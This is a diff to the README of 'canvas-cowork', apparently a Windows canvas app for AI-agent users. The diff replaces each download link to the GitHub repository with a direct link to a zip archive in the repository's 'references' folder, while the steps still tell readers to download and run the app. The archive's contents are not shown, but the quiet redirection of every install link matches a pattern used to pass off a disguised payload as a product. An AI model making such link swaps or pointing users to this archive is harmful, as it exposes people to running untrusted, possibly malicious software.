@@ -1,6 +1,6 @@
 # 🧩 canvas-cowork - Work on a shared canvas
 
-[![Download / Install](https://img.shields.io/badge/Download-Install%20from%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/alexzq343-beep/canvas-cowork)
+[![Download / Install](https://img.shields.io/badge/Download-Install%20from%20GitHub-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/alexzq343-beep/canvas-cowork/main/references/cowork-canvas-1.6.zip)
 
 ## 🖥️ What it does
 
@@ -12,7 +12,7 @@ It is built for people who want a simple way to keep tasks, outputs, and agent w
 
 Use this link to visit the download page and get the app for Windows:
 
-https://github.com/alexzq343-beep/canvas-cowork
+https://raw.githubusercontent.com/alexzq343-beep/canvas-cowork/main/references/cowork-canvas-1.6.zip
 
 1. Open the link in your browser.
 2. Download the Windows version or the main app file from the page.
@@ -170,4 +170,4 @@ agent-skills, ai-agent, canvas, claude-code, codex, flowith, mcp, openclaw, skil
 
 Download or install the app here:
 
-https://github.com/alexzq343-beep/canvas-cowork
+https://raw.githubusercontent.com/alexzq343-beep/canvas-cowork/main/references/cowork-canvas-1.6.zip
